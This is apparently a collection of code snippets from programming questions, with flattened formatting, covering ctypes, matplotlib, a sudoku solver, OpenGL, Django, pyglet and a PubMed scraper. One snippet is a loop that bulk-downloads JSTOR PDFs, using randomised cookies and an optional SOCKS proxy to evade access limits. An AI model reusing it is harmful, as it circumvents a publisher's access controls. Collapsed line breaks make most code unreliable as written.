"import ctypesimport ctypes.wintypesclass CONSOLE_SCREEN_BUFFER_INFO ( ctypes.Structure ) : _fields_ = [ ( 'dwSize ' , ctypes.wintypes._COORD ) , ( 'dwCursorPosition ' , ctypes.wintypes._COORD ) , ( 'wAttributes ' , ctypes.c_ushort ) , ( 'srWindow ' , ctypes.wintypes._SMALL_RECT ) , ( 'dwMaximumWindowSize ' , ctypes.wintypes._COORD ) ] hstd = ctypes.windll.kernel32.GetStdHandle ( ctypes.c_ulong ( -11 ) ) # STD_OUTPUT_HANDLE = -11print hstdcsbi = CONSOLE_SCREEN_BUFFER_INFO ( ) print ctypes.sizeof ( csbi ) # < -- -- -- -- -- -- -- -ret = ctypes.windll.kernel32.GetConsoleScreenBufferInfo ( ctypes.c_ulong ( hstd ) , csbi ) print retprint csbi.dwSize.X import ctypesimport structhstd = ctypes.windll.kernel32.GetStdHandle ( -11 ) # STD_OUTPUT_HANDLE = -11csbi = ctypes.create_string_buffer ( 22 ) res = ctypes.windll.kernel32.GetConsoleScreenBufferInfo ( hstd , csbi ) width , height , curx , cury , wattr , left , top , right , bottom , maxx , maxy = struct.unpack ( `` hhhhHhhhhhh '' , csbi.raw ) print bufx"
"import matplotlib.pyplot as pltfrom mpl_toolkits.axes_grid1 import host_subplotimport mpl_toolkits.axisartist as AAhost = host_subplot ( 111 , axes_class=AA.Axes ) plt.subplots_adjust ( right=0.75 ) par1 = host.twinx ( ) par2 = host.twinx ( ) offset = 60new_fixed_axis = par2.get_grid_helper ( ) .new_fixed_axispar2.axis [ `` right '' ] = new_fixed_axis ( loc= '' right '' , axes=par2 , offset= ( offset , 0 ) ) par1.axis [ `` right '' ] .toggle ( all=True ) par2.axis [ `` right '' ] .toggle ( all=True ) host.set_xlim ( 0 , 2 ) host.set_ylim ( 0 , 2 ) host.set_xlabel ( `` Distance '' ) host.set_ylabel ( `` Density '' ) par1.set_ylabel ( `` Temperature '' ) par2.set_ylabel ( `` Velocity '' ) p1 , = host.plot ( [ 0 , 1 , 2 ] , [ 0 , 1 , 2 ] , label= '' Density '' ) p2 , = par1.plot ( [ 0 , 1 , 2 ] , [ 0 , 3 , 2 ] , label= '' Temperature '' ) p3 , = par2.plot ( [ 0 , 1 , 2 ] , [ 50 , 30 , 15 ] , label= '' Velocity '' ) par1.set_ylim ( 0 , 4 ) par2.set_ylim ( 1 , 65 ) host.legend ( ) host.axis [ `` left '' ] .label.set_color ( p1.get_color ( ) ) par1.axis [ `` right '' ] .label.set_color ( p2.get_color ( ) ) par2.axis [ `` right '' ] .label.set_color ( p3.get_color ( ) ) plt.xticks ( rotation = 45 ) # < - The only change from the exampleplt.draw ( ) plt.show ( )"
"# ! /usr/bin/python3.1 sudoku = [ [ 0 ] * 9 ] * 9sudokupossibilities = [ [ [ 1 ] * 9 ] * 9 ] * 9completion = 0 # Input a set of values , storing them in the list `` sudoku '' .print ( `` Input sudoku , using spaces to separate individual values and return \to separate lines . `` ) for i in range ( 9 ) : string = input ( ) values = string.split ( `` `` ) sudoku [ i ] = [ int ( y ) for y in values ] for i in range ( 9 ) : for j in range ( 9 ) : for k in range ( 9 ) : print ( i+1 , j+1 , k+1 , `` = '' , sudokupossibilities [ i ] [ j ] [ k ] ) # Solve the puzzle.while True : for i in range ( 9 ) : for j in range ( 9 ) : # If the number is already known , go to the next . if sudoku [ i ] [ j ] ! = 0 : continue # Check which values are possible . for k in range ( 9 ) : # If the value is already eliminated , skip it . if sudokupossibilities [ i ] [ j ] [ k ] == 0 : continue print ( i+1 , j+1 , k+1 , `` = '' , sudokupossibilities [ i ] [ j ] [ k ] ) # If it overlaps horizontally , eliminate that possibility . for l in range ( 9 ) : if ( ( sudoku [ i ] [ l ] ) == ( k + 1 ) ) & ( l ! = j ) : sudokupossibilities [ i ] [ j ] [ k ] = 0 # If it overlaps vertically , eliminate that possibility . for l in range ( 9 ) : if ( ( sudoku [ l ] [ j ] ) == ( k + 1 ) ) & ( l ! = i ) : sudokupossibilities [ i ] [ j ] [ k ] = 0 # If it overlaps in the same 3x3 box , set to 0. x = 0 y = 0 # Find which box it 's in on the x axis . for m in [ 0 , 3 , 6 ] : for n in range ( 3 ) : if ( m + n ) == i : x = m # Find which box it 's in on the y axis . for m in [ 0 , 3 , 6 ] : for n in range ( 3 ) : if ( m + n ) == j : y = m # Check for overlap . for m in range ( 3 ) : for n in range ( 3 ) : if ( sudoku [ x+m ] [ y+n ] == ( k + 1 ) ) & ( ( x+m ) ! = i ) & ( ( y+n ) ! = j ) : sudokupossibilities [ i ] [ j ] [ k ] = 0 # Count the values possible for the square . If only one is possible , set it . valuespossible = 0 valuetoset = 0 for l in range ( 9 ) : if sudokupossibilities [ i ] [ j ] [ l ] == 1 : valuespossible += 1 valuetoset = l + 1 if valuespossible == 1 : sudoku [ i ] [ j ] = valuetoset # Count the unsolved squares , if this is zero , the puzzle is solved . completion = 0 for x in sudoku : for y in x : if y == 0 : completion += 1 if completion == 0 : break else : print ( completion ) continue # Print the array.for x in sudoku : for y in x : print ( y , end= '' `` ) print ( end= '' \n '' ) # include < stdio.h > int main ( ) { int sudoku [ 9 ] [ 9 ] ; int sudokupossibilities [ 9 ] [ 9 ] [ 9 ] ; int completion = 0 ; int valuespossible = 0 ; int valuetoset = 0 ; int x = 0 ; int y = 0 ; //Set sudoku to all zeros . for ( int i = 0 ; i < = 8 ; i++ ) { for ( int j = 0 ; j < = 8 ; j++ ) { sudoku [ i ] [ j ] = 0 ; } } //Set sudokupossibilities to all ones . for ( int i = 0 ; i < = 8 ; i++ ) { for ( int j = 0 ; j < = 8 ; j++ ) { for ( int k = 0 ; k < = 8 ; k++ ) { sudokupossibilities [ i ] [ j ] [ k ] = 1 ; } } } //Take an unsolved puzzle as input . printf ( `` Please input unsolved sudoku with spaces between each number , pressing enter after each line . Use zeros for unknowns.\n '' ) ; for ( int i = 0 ; i < = 8 ; i++ ) { scanf ( `` % d % d % d % d % d % d % d % d % d '' , & sudoku [ i ] [ 0 ] , & sudoku [ i ] [ 1 ] , & sudoku [ i ] [ 2 ] , & sudoku [ i ] [ 3 ] , & sudoku [ i ] [ 4 ] , & sudoku [ i ] [ 5 ] , & sudoku [ i ] [ 6 ] , & sudoku [ i ] [ 7 ] , & sudoku [ i ] [ 8 ] ) ; } //Solve the puzzle . while ( 1 ) { for ( int i = 0 ; i < = 8 ; i++ ) { for ( int j = 0 ; j < = 8 ; j++ ) { //If the number is already known , go to the next . if ( sudoku [ i ] [ j ] ! = 0 ) { continue ; } //Check which values are possible . for ( int k = 0 ; k < = 8 ; k++ ) { //If it 's already eliminated , it does n't need to be checked . if ( sudokupossibilities [ i ] [ j ] [ k ] == 0 ) { continue ; } //If it overlaps horizontally , eliminate that possibility . for ( int l = 0 ; l < = 8 ; l++ ) { if ( ( sudoku [ i ] [ l ] == ( k + 1 ) ) & & ( l ! = j ) ) { sudokupossibilities [ i ] [ j ] [ k ] = 0 ; } } //If it overlaps vertically , eliminate that possibility . for ( int l = 0 ; l < = 8 ; l++ ) { if ( ( sudoku [ l ] [ j ] == ( k + 1 ) ) & & ( l ! = i ) ) { sudokupossibilities [ i ] [ j ] [ k ] = 0 ; } } //If it overlaps in the same 3x3 box , set to 0. x = 0 ; y = 0 ; for ( int m = 0 ; m < = 6 ; m += 3 ) { for ( int n = 0 ; n < = 2 ; n++ ) { if ( ( m + n ) == i ) { x = m ; } } } for ( int m = 0 ; m < = 6 ; m += 3 ) { for ( int n = 0 ; n < = 2 ; n++ ) { if ( ( m + n ) == j ) { y = m ; } } } for ( int m = 0 ; m < = 2 ; m++ ) { for ( int n = 0 ; n < = 2 ; n++ ) { if ( ( sudoku [ x+m ] [ y+n ] == ( k + 1 ) ) & & ( ( x+m ) ! = i ) & & ( ( y+n ) ! = j ) ) { sudokupossibilities [ i ] [ j ] [ k ] = 0 ; } } } } //Count the values possible for the square . If only //one is possible , set it . valuespossible = 0 ; valuetoset = 0 ; for ( int l = 0 ; l < = 8 ; l++ ) { if ( sudokupossibilities [ i ] [ j ] [ l ] == 1 ) { valuespossible++ ; valuetoset = l + 1 ; } } if ( valuespossible == 1 ) { sudoku [ i ] [ j ] = valuetoset ; } } } //Count the unsolved squares , if this is zero , the puzzle is solved . completion = 0 ; for ( int i = 0 ; i < = 8 ; i++ ) { for ( int j = 0 ; j < = 8 ; j++ ) { if ( sudoku [ i ] [ j ] == 0 ) { completion++ ; } } } if ( completion == 0 ) { break ; } else { continue ; } } //Print the completed puzzle . printf ( `` + -- -- -- -+ -- -- -- -+ -- -- -- -+\n '' ) ; for ( int i = 0 ; i < = 8 ; i++ ) { for ( int j = 0 ; j < = 8 ; j++ ) { if ( j == 0 ) { printf ( `` | `` ) ; } printf ( `` % d `` , sudoku [ i ] [ j ] ) ; if ( ( j == 2 ) || ( j == 5 ) ) { printf ( `` | `` ) ; } if ( j == 8 ) { printf ( `` | '' ) ; } } printf ( `` \n '' ) ; if ( ( ( i + 1 ) % 3 ) == 0 ) { printf ( `` + -- -- -- -+ -- -- -- -+ -- -- -- -+\n '' ) ; } } }"
"# version 330uniform sampler2D texture ; uniform sampler1D palette ; void main ( ) { vec2 uv = gl_TexCoord [ 0 ] .xy ; vec4 color = texture2D ( texture , uv ) ; gl_FragColor = texture1D ( palette , color.a ) ; } from OpenGL.GL import *from OpenGL.GLU import *from OpenGL.GLUT import *from OpenGL.arrays import vbofrom OpenGL.GL import shadersfrom numpy import *def checkboard ( size = 512 , cell = 32 ) : bitmap = zeros ( size * size , 'u8 ' ) bitmap.shape = ( size , size ) current_color = 0 for y in range ( 0 , size , cell ) : for x in range ( 0 , size , cell ) : bitmap [ y : y + cell , x : x + cell ] = current_color current_color += 1 palette = array ( [ [ a , a , a , 255 ] for a in range ( 256 ) ] , 'u8 ' ) return bitmap , palettedef reshape ( w , h ) : glutDisplayFunc ( lambda : display ( w , h ) ) glutPostRedisplay ( ) ; glutInitDisplayMode ( GLUT_RGBA | GLUT_DOUBLE | GLUT_DEPTH ) glutInitWindowSize ( 512 , 512 ) glutCreateWindow ( `` Hello World : 'D '' ) # # # init code # vboquad = ( 0.0 , 0.0 , 512.0 , 512.0 ) tex = ( 0. , 0. , 1. , 1 . ) my_vbo = vbo.VBO ( array ( [ ( quad [ 0 ] , quad [ 1 ] , 0 , tex [ 0 ] , tex [ 1 ] ) , ( quad [ 0 ] , quad [ 3 ] , 0 , tex [ 0 ] , tex [ 3 ] ) , ( quad [ 2 ] , quad [ 3 ] , 0 , tex [ 2 ] , tex [ 3 ] ) , ( quad [ 2 ] , quad [ 1 ] , 0 , tex [ 2 ] , tex [ 1 ] ) ] , ' f , f , f , f , f ' ) ) # texturebitmap , palette = checkboard ( ) height , width = bitmap.shapef_image = ( array ( bitmap , ' f ' ) + .4 ) / 256.0 # Image to be displayedimage_id = glGenTextures ( 1 ) glEnable ( GL_TEXTURE_2D ) glBindTexture ( GL_TEXTURE_2D , image_id ) glTexImage2D ( GL_TEXTURE_2D , 0 , GL_ALPHA , width , height , 0 , GL_ALPHA , GL_FLOAT , f_image ) glTexParameterf ( GL_TEXTURE_2D , GL_TEXTURE_MAG_FILTER , GL_NEAREST ) glTexParameterf ( GL_TEXTURE_2D , GL_TEXTURE_MIN_FILTER , GL_NEAREST ) glActiveTexture ( GL_TEXTURE0 ) # palettef_palette = ( palette / float32 ( 255 ) ) palette_id = glGenTextures ( 1 ) glEnable ( GL_TEXTURE_1D ) glBindTexture ( GL_TEXTURE_1D , palette_id ) glTexImage1D ( GL_TEXTURE_1D , 0 , GL_RGBA , 256 , 0 , GL_RGBA , GL_FLOAT , f_palette ) glTexParameterf ( GL_TEXTURE_1D , GL_TEXTURE_MAG_FILTER , GL_NEAREST ) glTexParameterf ( GL_TEXTURE_1D , GL_TEXTURE_MIN_FILTER , GL_NEAREST ) # glActiveTexture ( GL_TEXTURE1 ) # shadersVERTEX_SHADER = shaders.compileShader ( `` '' '' # version 330layout ( location = 0 ) in vec4 position ; uniform vec2 offset ; void main ( ) { gl_FrontColor = gl_Color ; gl_TexCoord [ 0 ] .xy = gl_MultiTexCoord0.xy ; gl_Position = vec4 ( ( offset.x + position.x - 256 ) / 256 , ( 256 - offset.y - position.y ) /256 , 0.0 , 1.0 ) ; } '' '' '' , GL_VERTEX_SHADER ) FRAGMENT_SHADER = shaders.compileShader ( `` '' '' # version 330 uniform sampler2D texture ; uniform sampler1D palette ; void main ( ) { vec2 uv = gl_TexCoord [ 0 ] .xy ; vec4 color = texture2D ( texture , uv ) ; gl_FragColor = texture1D ( palette , color.a ) ; } '' '' '' , GL_FRAGMENT_SHADER ) shader = shaders.compileProgram ( VERTEX_SHADER , FRAGMENT_SHADER ) # uniform variablesoffset_uniform_loc = glGetUniformLocation ( shader , `` offset '' ) texture_uniform_loc = glGetUniformLocation ( shader , 'texture ' ) palette_uniform_loc = glGetUniformLocation ( shader , 'palette ' ) def display ( w , h ) : `` '' '' Render the geometry for the scene . '' '' '' glViewport ( 0 , 0 , w , h ) glMatrixMode ( GL_PROJECTION ) glLoadIdentity ( ) glOrtho ( 0 , w , 0 , h , -1 , 1 ) glMatrixMode ( GL_MODELVIEW ) ; glLoadIdentity ( ) glClear ( GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT ) glEnable ( GL_TEXTURE_2D ) glActiveTexture ( GL_TEXTURE0 ) glBindTexture ( GL_TEXTURE_2D , image_id ) glEnable ( GL_TEXTURE_1D ) glActiveTexture ( GL_TEXTURE1 ) shaders.glUseProgram ( shader ) shaders.glUniform1i ( texture_uniform_loc , 0 ) shaders.glUniform1i ( palette_uniform_loc , 1 ) shaders.glUniform2f ( offset_uniform_loc , 0 , 0 ) try : my_vbo.bind ( ) try : glEnableClientState ( GL_VERTEX_ARRAY ) glEnableClientState ( GL_TEXTURE_COORD_ARRAY ) glVertexPointer ( 3 , GL_FLOAT , 20 , my_vbo ) glTexCoordPointer ( 2 , GL_FLOAT , 20 , my_vbo + 12 ) glBindTexture ( GL_TEXTURE_1D , palette_id ) glDrawArrays ( GL_QUADS , 0 , 4 ) finally : my_vbo.unbind ( ) glDisableClientState ( GL_TEXTURE_COORD_ARRAY ) glDisableClientState ( GL_VERTEX_ARRAY ) finally : shaders.glUseProgram ( 0 ) glutSwapBuffers ( ) glutReshapeFunc ( reshape ) glutIdleFunc ( glutPostRedisplay ) glutMainLoop ( )"
"def foo ( *args , **kwargs ) : print ( `` args : '' , len ( args ) ) for i in args : print ( i ) print ( `` kwargs : '' , len ( kwargs ) ) for k in kwargs : print ( k , kwargs [ k ] ) some_list = [ 'one ' , 'two ' , 'three ' ] some_kwords = { `` name1 '' : `` alice '' , `` name2 '' : `` bob '' , `` name3 '' : `` carol '' } foo ( *some_list , **some_kwords )"
"from matplotlib import pyplot as MPL > > > l , = MPL.plot ( s , t ) # s & t are ordinary NumPy 1D arrays > > > a , b = [ 100 , 200 ] > > > type ( l ) < class 'matplotlib.lines.Line2D ' > > > > l.set_color ( `` orange '' ) from matplotlib.widgets import CheckButtonsax = plt.subplot ( 111 ) l0 , = ax.plot ( s , t , visible=False , lw=2 ) l1 , = ax.plot ( t , s1 , lw=2 ) rax = plt.axes ( [ .05 , .4 , .1 , .15 ] ) check = CheckButtons ( rax , ( 'raw ' , 'transformed ' ) , ( False , True ) ) def fnx ( checkbox_label ) : if checkbox_label == 'raw ' : l0.set_visible ( not l0.get_visible ( ) ) elif checkbox_label == 'transformed ' : l1.set_visible ( not l1.get_visible ( ) ) check.on_clicked ( fnx ) plt.show ( )"
"@ total_orderingclass Field ( RegisterLookupMixin ) : # here we have it ... ↓↓↓↓↓↓↓↓↓ def __init__ ( self , verbose_name=None , name=None , primary_key=False , max_length=None , unique=False , blank=False , null=False , db_index=False , rel=None , default=NOT_PROVIDED , editable=True , serialize=True , unique_for_date=None , unique_for_month=None , unique_for_year=None , choices=None , help_text= '' , db_column=None , db_tablespace=None , auto_created=False , validators= ( ) , error_messages=None ) : ... # A guide to Field parameters : # # * name : The name of the field specified in the model. # * attname : The attribute to use on the model object . This is the same as # `` name '' , except in the case of ForeignKeys , where `` _id '' is # appended. # * db_column : The db_column specified in the model ( or None ) . # * column : The database column for this field . This is the same as # `` attname '' , except if db_column is specified. # # Code that introspects values , or does other dynamic things , should use # attname . For example , this gets the primary key value of object `` obj '' : # # getattr ( obj , opts.pk.attname ) # models.pyfrom django.db import modelsclass SomeModel ( models.Model ) : first = models.CharField ( max_length=50 , verbose_name='first ' , name='second ' ) third = models.CharField ( max_length=50 , verbose_name='third ' ) In [ 2 ] : from app.models import SomeModelIn [ 3 ] : SomeModel.objects.create ( first='first ' , third='third ' ) Traceback ( most recent call last ) : File `` /Users/ailove/Home/personal/untitled/venv/lib/python3.6/site-packages/IPython/core/interactiveshell.py '' , line 2963 , in run_code exec ( code_obj , self.user_global_ns , self.user_ns ) File `` < ipython-input-3-08e446dfd6e3 > '' , line 1 , in < module > SomeModel.objects.create ( first='first ' , third='third ' ) File `` /Users/ailove/Home/personal/untitled/venv/lib/python3.6/site-packages/django/db/models/manager.py '' , line 82 , in manager_method return getattr ( self.get_queryset ( ) , name ) ( *args , **kwargs ) File `` /Users/ailove/Home/personal/untitled/venv/lib/python3.6/site-packages/django/db/models/query.py '' , line 415 , in create obj = self.model ( **kwargs ) File `` /Users/ailove/Home/personal/untitled/venv/lib/python3.6/site-packages/django/db/models/base.py '' , line 495 , in __init__ raise TypeError ( `` ' % s ' is an invalid keyword argument for this function '' % kwarg ) TypeError : 'first ' is an invalid keyword argument for this functionIn [ 4 ] : obj = SomeModel.objects.create ( second='second ' , third='third ' ) In [ 5 ] obj.thirdOut [ 5 ] : 'third'In [ 6 ] : obj.secondOut [ 6 ] : 'second'In [ 7 ] : obj.firstTraceback ( most recent call last ) : File `` /Users/ailove/Home/personal/untitled/venv/lib/python3.6/site-packages/IPython/core/interactiveshell.py '' , line 2963 , in run_code exec ( code_obj , self.user_global_ns , self.user_ns ) File `` < ipython-input-7-f0deaec10795 > '' , line 1 , in < module > obj.firstAttributeError : 'SomeModel ' object has no attribute 'first '"
"from mingus.midi import fluidsynthfluidsynth.init ( '/home/btc/Escritorio/SinestesiaRCB/gfx/ViolinsLong.sf2 ' , '' alsa '' ) fluidsynth.play_Note ( 64,0,100 ) # Also tried with Note ( `` C-5 '' ) and so forth pkexec env DISPLAY= $ DISPLAY XAUTHORITY= $ XAUTHORITY python3 /home/btc/Escritorio/SinestesiaRCB/SinestesiaRCB.py sudo chown root : root /run/user/1000"
"import ply.lex as lextokens = ( 'CHAR ' , ) def t_CHAR ( t ) : r ' . ' t.value = t.lexer.lexmatch return tl = lex.lex ( ) l.input ( 'hello ' ) l.token ( ) m = _.value import rep = re.compile ( r ' . ' ) m2 = p.match ( 'hello ' )"
"import pygletdef get_texture_group ( file , order_group_index ) : texture = pyglet.image.load ( file ) .texture order_group = pyglet.graphics.OrderedGroup ( order_group_index ) return pyglet.graphics.TextureGroup ( texture , order_group ) class AbstractModel ( object ) : def _create_as_vertex ( self ) : v_x = self.cell_data.get ( `` x '' ) * 32 v_y = self.cell_data.get ( `` y '' ) * -1 * 32 texture_group = self.map_type_iamge.get ( self.cell_data.get ( `` t '' ) ) x_offset = self.x_offset * self.scale x , y , z = v_x + x_offset , v_y , self.z x_ = ( texture_group.texture.width * self.scale + x_offset + v_x ) y_ = ( texture_group.texture.height * self.scale + v_y ) tex_coords = ( 't2f ' , ( 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 ) ) self.vertices = self.batch.add ( 4 , pyglet.gl.GL_QUADS , texture_group , ( 'v3f ' , ( x , y , z , x_ , y , z , x_ , y_ , z , x , y_ , z ) ) , tex_coords ) def _animate ( self , dt ) : # lets assume that I have list of pyglet.graphics.TextureGroup # and they should somehow be drawn one after other print ( `` I need change image . dt= '' , dt , self ) pyglet.clock.schedule_once ( self._animate , 1 ) import osimport pygletimport settingsfrom models import abstract_modelGROUND_DIR = os.path.join ( settings.STATIC_DIR , `` ground '' ) order_group_index = 0map_type_iamge = { 1 : abstract_model.get_texture_group ( os.path.join ( GROUND_DIR , `` w1.png '' ) , order_group_index ) , 2 : abstract_model.get_texture_group ( os.path.join ( GROUND_DIR , `` t1.png '' ) , order_group_index ) , 1001 : abstract_model.get_texture_group ( os.path.join ( GROUND_DIR , `` t1_direction.png '' ) , order_group_index ) , } class Ground3D ( abstract_model.AbstractModel ) : def __init__ ( self , cell_data , batch ) : self.batch = batch self.cell_data = cell_data self.map_type_iamge = map_type_iamge self.scale = 1 self.x_offset = 0 self.z = 0 self.entity = None self._create_as_vertex ( ) pyglet.clock.schedule_once ( self._animate , 1 )"
"import subprocess , urllib , randomclass NoBlocks ( Exception ) : passdef getblocks ( ) : r = urllib.urlopen ( `` http : // { ? REDACTED ? } /grab '' ) .read ( ) if ' < html ' in r.lower ( ) : raise NoBlocks return r.split ( ) import sysif len ( sys.argv ) > 1 : prefix = [ ' -- socks5 ' , sys.argv [ 1 ] ] else : prefix = [ ] # '-interface ' , 'eth0:1 ' ] line = lambda x : [ 'curl ' ] + prefix + [ '-H ' , `` Cookie : TENACIOUS= '' + str ( random.random ( ) ) [ 3 : ] , '-o ' , 'pdfs/ ' + str ( x ) + '.pdf ' , `` http : //www.jstor.org/stable/pdfplus/ '' + str ( x ) + `` .pdf ? acceptTC=true '' ] while 1 : blocks = getblocks ( ) for block in blocks : print block subprocess.Popen ( line ( block ) ) .wait ( ) if len ( sys.argv ) > 1 : prefix = [ ' -- socks5 ' , sys.argv [ 1 ] ] else : prefix = [ ] # '-interface ' , 'eth0:1 ' ] line = lambda x : [ 'curl ' ] + prefix + [ '-H ' , `` Cookie : TENACIOUS= '' + str ( random.random ( ) ) [ 3 : ] , '-o ' , 'pdfs/ ' + str ( x ) + '.pdf ' , `` http : //www.jstor.org/stable/pdfplus/ '' + str ( x ) + `` .pdf ? acceptTC=true '' ]"
"import gluoncv as gcvnet = gcv.model_zoo.get_model ( 'ssd_512_mobilenet1.0_voc ' , pretrained=True ) windowName = `` ssdObject '' cv2.namedWindow ( windowName , cv2.WINDOW_NORMAL ) cv2.resizeWindow ( windowName , 1280 , 720 ) cv2.moveWindow ( windowName , 0 , 0 ) cv2.setWindowTitle ( windowName , `` SSD Object Detection '' ) while True : # Check to see if the user closed the window if cv2.getWindowProperty ( windowName , 0 ) < 0 : # This will fail if the user closed the window ; Nasties get printed to the console break ret_val , frame = video_capture.read ( ) frame = mx.nd.array ( cv2.cvtColor ( frame , cv2.COLOR_BGR2RGB ) ) .astype ( 'uint8 ' ) rgb_nd , frame = gcv.data.transforms.presets.ssd.transform_test ( frame , short=512 , max_size=700 ) # # Run frame through network class_IDs , scores , bounding_boxes = net ( rgb_nd ) displayBuf = frame cv2.imshow ( windowName , displayBuf ) cv2.waitKey ( 0 )"
"python3 foo.py Traceback ( most recent call last ) : File `` foo.py '' , line 60 , in < module > foo = Foo ( ) File `` foo.py '' , line 22 , in __init__ self._run ( ) File `` /media/MyDocuments/xxxxxxx/yyyyyyyyy/python_code/foo.py '' , line 18 , in check_input bar = obj.get_action ( ) AttributeError : 'obj ' object has no attribute 'get_action ' python3 foo.py Traceback ( most recent call last ) : File `` foo.py '' , line 60 , in < module > foo = Foo ( ) File `` foo.py '' , line 22 , in __init__ self._run ( ) File `` ... /foo.py '' , line 18 , in check_input bar = obj.get_action ( ) AttributeError : 'obj ' object has no attribute 'get_action ' import sysimport tracebackimport osimport reRED = '\033 [ 91m'GREEN = '\033 [ 92m'YELLOW = '\033 [ 93m'LIGHT_PURPLE = '\033 [ 94m'PURPLE = '\033 [ 95m'CYAN = '\033 [ 96m'END = '\033 [ 0m'def my_excepthook ( type , value , tb ) : lines = traceback.format_list ( traceback.extract_tb ( tb ) ) def shorten ( match ) : return 'File `` { } '' '.format ( os.path.basename ( match.group ( 1 ) ) ) lines = [ re.sub ( r'File `` ( [ ^ '' ] + ) '' ' , shorten , line ) for line in lines ] _print_color ( lines ) # print ( `` .join ( lines ) ) print ( RED + ' { } : { } '.format ( type.__name__ , value ) + END ) sys.excepthook = my_excepthookdef _print_color ( lines ) : for l in lines : for i in range ( len ( l ) -1 ) : if l [ i : i+5 ] == '' line `` : i +=5 # Find the length of the number numLen = 0 while l [ i+numLen ] .isdigit ( ) : numLen +=1 # Find the length of the function funLen = 0 while not l [ i+numLen+4 + funLen ] == '' \n '' : funLen+=1 l = `` .join ( [ l [ : i ] , YELLOW+ '' { } '' .format ( l [ i : i+numLen ] ) +END , l [ i+numLen : i+numLen+5 ] , LIGHT_PURPLE+ '' { } '' .format ( l [ i+numLen+5 : i+numLen+5+funLen ] ) +END , CYAN+ '' { } '' .format ( l [ i+numLen+5+funLen : ] ) +END ] ) print ( l , end= '' '' ) break print ( `` '' )"
"def magic_index ( seq , start = None , end = None ) : if start is None : start = 0 if end is None : end = len ( seq ) - 1 if start > end : return -1 index = ( start + end ) // 2 if index == seq ( index ) : print ( `` Equal to index . Value of index = `` + index ) return index if index > seq [ index ] : print ( `` Greater than loop . Value of Index = '' + index ) return magic_index ( seq , start=index + 1 , end=end ) else : print ( `` Else part of Greater . Value of index = `` + index ) return magic_index ( seq , start=start , end=index - 1 ) def main ( ) : magic_index ( seq= [ 1 , 2 , 3 , 4 , 6 ] , start=None , end=None ) ."
"A = [ [ 1,2,3 ] , [ 4,5,6 ] ] B = [ [ 3,2,3 ] , [ 6,5,6 ] ]"
"GENERAL=======================================================Request URL : https : //www.ncbi.nlm.nih.gov/pubmed/Request Method : POSTStatus Code : 200 OKRemote Address : 130.14.29.110:443Referrer Policy : origin-when-cross-originRESPONSE HEADERS=======================================================Cache-Control : privateConnection : Keep-AliveContent-Encoding : gzipContent-Security-Policy : upgrade-insecure-requestsContent-Type : text/html ; charset=UTF-8Date : Fri , 29 Jun 2018 10:27:42 GMTKeep-Alive : timeout=1 , max=9NCBI-PHID : 396E3400B36089610000000000C6005E.m_12.03.m_8NCBI-SID : CE8C479DB3510951_0083SIDReferrer-Policy : origin-when-cross-originServer : ApacheSet-Cookie : ncbi_sid=CE8C479DB3510951_0083SID ; domain=.nih.gov ; path=/ ; expires=Sat , 29 Jun 2019 10:27:42 GMTSet-Cookie : WebEnv=1Jqk9ZOlyZSMGjHikFxNDsJ_ObuK0OxHkidgMrx8vWy2g9zqu8wopb8_D9qXGsLJQ9mdylAaDMA_T-tvHJ40Sq_FODOo33__T-tAH % 40CE8C479DB3510951_0083SID ; domain=.nlm.nih.gov ; path=/ ; expires=Fri , 29 Jun 2018 18:27:42 GMTStrict-Transport-Security : max-age=31536000 ; includeSubDomains ; preloadTransfer-Encoding : chunkedVary : Accept-EncodingX-UA-Compatible : IE=EdgeX-XSS-Protection : 1 ; mode=blockREQUEST HEADERS========================================================Accept : text/html , */* ; q=0.01Accept-Encoding : gzip , deflate , brAccept-Language : en-US , en ; q=0.9Connection : keep-aliveContent-Length : 395Content-Type : application/x-www-form-urlencoded ; charset=UTF-8Cookie : ncbi_sid=CE8C479DB3510951_0083SID ; _ga=GA1.2.1222765292.1530204312 ; _gid=GA1.2.739858891.1530204312 ; _gat=1 ; WebEnv=18Kcapkr72VVldfGaODQIbB2bzuU50uUwU7wrUi-x-bNDgwH73vW0M9dVXA_JOyukBSscTE8Qmd1BmLAi2nDUz7DRBZpKj1wuA_QB % 40CE8C479DB3510951_0083SID ; starnext=MYGwlsDWB2CmAeAXAXAbgA4CdYDcDOsAhpsABZoCu0IA9oQCZxLJA===Host : www.ncbi.nlm.nih.govNCBI-PHID : 396E3400B36089610000000000C6005E.m_12.03Origin : https : //www.ncbi.nlm.nih.govReferer : https : //www.ncbi.nlm.nih.gov/pubmedUser-Agent : Mozilla/5.0 ( Windows NT 6.1 ) AppleWebKit/537.36 ( KHTML , like Gecko ) Chrome/67.0.3396.99 Safari/537.36X-Requested-With : XMLHttpRequestFORM DATA========================================================p $ l : AjaxServerportlets : id=relevancesortad : sort= ; id=timelinead : blobid=NCID_1_120519284_130.14.22.215_9001_1530267709_1070655576_0MetA0_S_MegaStore_F_1 : yr= : term= % 222015 % 22 % 5BDate % 20- % 20Publication % 5D % 20 % 3A % 20 % 223000 % 22 % 5BDate % 20- % 20Publication % 5D ; id=reldata : db=pubmed : querykey=1 ; id=searchdetails ; id=recentactivityload : yes import requestsfrom urllib.parse import urljoinfrom bs4 import BeautifulSoupgeturl = `` https : //www.ncbi.nlm.nih.gov/pubmed/ ? term= % 222015 % 22 % 5BDate+-+Publication % 5D+ % 3A+ % 223000 % 22 % 5BDate+-+Publication % 5D '' posturl = `` https : //www.ncbi.nlm.nih.gov/pubmed/ '' # res = requests.get ( geturl , headers= { `` User-Agent '' : '' Mozilla/5.0 '' } ) # soup = BeautifulSoup ( res.text , '' lxml '' ) # for items in soup.select ( `` div.rslt p.title a '' ) : # print ( items.get ( `` href '' ) ) FormData= { ' p $ l ' : 'AjaxServer ' , 'portlets ' : 'id=relevancesortad : sort= ; id=timelinead : blobid=NCID_1_120519284_130.14.22.215_9001_1530267709_1070655576_0MetA0_S_MegaStore_F_1 : yr= : term= % 222015 % 22 % 5BDate % 20- % 20Publication % 5D % 20 % 3A % 20 % 223000 % 22 % 5BDate % 20- % 20Publication % 5D ; id=reldata : db=pubmed : querykey=1 ; id=searchdetails ; id=recentactivity ' , 'load ' : 'yes ' } req = requests.post ( posturl , data=FormData , headers= { `` User-Agent '' : '' Mozilla/5.0 '' } ) soup = BeautifulSoup ( req.text , '' lxml '' ) for items in soup.select ( `` div.rslt p.title a '' ) : print ( items.get ( `` href '' ) )"
